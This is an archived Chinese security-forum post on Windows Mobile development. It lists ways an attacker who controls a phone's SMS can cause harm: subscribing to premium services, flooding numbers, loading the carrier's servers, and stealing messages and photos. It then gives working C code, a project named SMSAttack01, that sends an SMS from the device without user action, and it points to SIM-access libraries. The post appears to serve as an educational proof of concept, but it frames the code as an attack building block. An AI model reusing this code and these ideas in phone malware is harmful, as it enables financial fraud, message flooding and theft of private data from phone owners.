
# \[WM 系统开发\]发送短信（祝大家元旦快乐！）

> 原文：[`www.pediy.com/kssd/pediy10/79782.html`](https://www.pediy.com/kssd/pediy10/79782.html)

收发短信是手机的一项基本功能。如果攻击者拥有了短信控制权同样会造成严重的影响。
01. 发送确认短信给付费号码，订制昂贵的付费服务。造成经济损失。
02. 向指定手机号码大量发送短信。用短信流淹没被攻击者手机。
03. 大量发送短信比如发 HF 到 10086 查话费，可能对运营商的服务器造成影响。（估计需要感染大量手机！）
04. 阅读目标机上的短信可以知道机主的很多信息，造成泄密。（可能会有银行密码，或者和女朋友的聊天记录！）
05. 将机主手机中的图片以彩信形式发回，可以得到很多有趣信息。（说不定又是一个艳照门事件！）
等等等等....
控制手机发送短信其实很简单只需要：`SmsOpen` 打开句柄。`SmsSendMessage` 发送消息。`SmsClose` 关闭句柄就可以实现。

`SmsSendMessage` 有 11 个参数，比较麻烦些。参数多且比较怪异。如果调用出错，可以以 16 进制输出返回值并打开 `SMS.H` 查看错误编码的含义。示例程序给出了一组可用的参数定义。要深入研究短信相关函数可以查询 `sms.dll`, `sim.dll`, `simsec.dll` 的函数列表并配合 MSDN 研究。
`sms.dll` 主要用于短信控制，`sim.dll` 可用于控制 SIM 卡获取保存在其中的重要信息,最后一个 `simsec.dll` 同 SIM 卡安全相关。

![](img/9b8dbb32897a64e64f6dcb90ff44d73d.jpg)

![](img/42b577c83dee1963f51cc232554a42d3.jpg)

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || SMSAttack01.rar |

```
#include "stdafx.h"
#include "SMSAttack01.h"
#include <windows.h>
#include <commctrl.h>
#include <sms.h>
#pragma comment(lib,"sms.lib")
#include "E:\\MFC 程序\\XHProgram\\MGSEI_ERROR.h"
#include "E:\\MFC 程序\\XHProgram\\XHLIB.h"
int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance,
                   LPTSTR    lpCmdLine,
                   int       nCmdShow)
{
    HRESULT      hResult = -1;
  SMS_HANDLE   hSMS = 0;
  HANDLE       hMessageAvailableEvent = 0;
  SMS_ADDRESS  dest;
  BYTE         SMSInfo[6]={'H',0,'F',0,0,0};
  BYTE         providerData[512];
  //打开 SMS 句柄
  hResult = SmsOpen(L"Microsoft Text SMS Protocol",
                  SMS_MODE_SEND,
              &hSMS,
            &hMessageAvailableEvent);
  if(S_OK != hResult)
  {
    ShowText(L"Open SMS Error!");
        return MGSEI_API_CALL_ERROR;
  }
  //设置短信发送地址
  ZeroMemory(&dest,sizeof(SMS_ADDRESS));
  dest.smsatAddressType = (SMS_ADDRESS_TYPE)1;
  wcscpy(dest.ptsAddress,L"10086");
  ZeroMemory(&providerData,512);
  //发送短消息
  hResult = SmsSendMessage(hSMS,
                         NULL,
                     &dest,
                     NULL,
                     SMSInfo,
                     sizeof(SMSInfo),
                     providerData,
                     164,
                     (SMS_DATA_ENCODING)0,
                     SMS_OPTION_DELIVERY_NONE,
                     0);
  //判断发送消息是否正确
  if(S_OK != hResult)
  {
    ShowText(L"Send SMS Error!");
        SmsClose(hSMS);
        return MGSEI_API_CALL_ERROR;
  }
  //关闭 hSMS 句柄和 hMessageAvailableEvent 句柄
    if(S_OK != SmsClose(hSMS))
  {
    ShowText(L"Close SMS Error!");
    return MGSEI_API_CALL_ERROR;
  }
  ShowSuccess();
  return MGSEI_NO_ERROR;
}
```
